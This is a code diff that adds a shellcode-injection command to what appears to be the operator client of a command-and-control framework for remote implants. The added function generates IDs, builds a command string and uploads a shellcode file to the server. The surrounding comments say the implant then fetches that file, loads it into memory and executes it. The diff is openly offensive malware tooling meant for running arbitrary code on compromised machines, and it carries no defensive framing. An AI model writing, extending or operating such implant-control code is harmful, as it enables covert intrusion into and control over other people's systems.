@@ -137,6 +137,31 @@ def cmd_shell(args: List[str], app):
 # The command is read first, and tells the implant where to pull the 
 # shellcode file from on the server, reads it into memory, and executes
 def cmd_shellcode_inject(args: List[str], app):
+    # Must be 2 args
+    client_errors.arg_len_error(args, 2, 2)
+
+    # Create a file id for the file to be saved
+    file_id = encryption.id_generator(N=32)
+
+    # Create a command id
+    cmd_id = encryption.id_generator(N=32)
+
+    # Create the command string
+    cmd_str = storage.create_command_str(cmd_id, storage.CMD_TYPE.CMD_SHELLCODE_INJECT, [file_id]) 
+
+    # Post the file, if it doesn't exist, will raise FileDoesntExist exception
+    uploaded_filename = post_file_command(file_path=args[1],
+                                          file_id=file_id,
+                                          cmd_id=cmd_id,
+                                          cmd_type=storage.CMD_TYPE.CMD_SHELLCODE_INJECT,
+                                          cmd_str=cmd_str
+                                          )
+    
+    # Check for server error on the return, raise a UploadFailure
+    if uploaded_filename == server_codes.ServerErrors.ERR_UPLOAD_EXCEPTION.value:
+        raise client_errors.UploadFailure 
+    
+    print_success(cmd_id=cmd_id, args=args, app=app)
     return
 # Different method of shellcode injection, this creates a process and injects it
 # into it, same client -> server -> implant transfer method as shellcode_inject
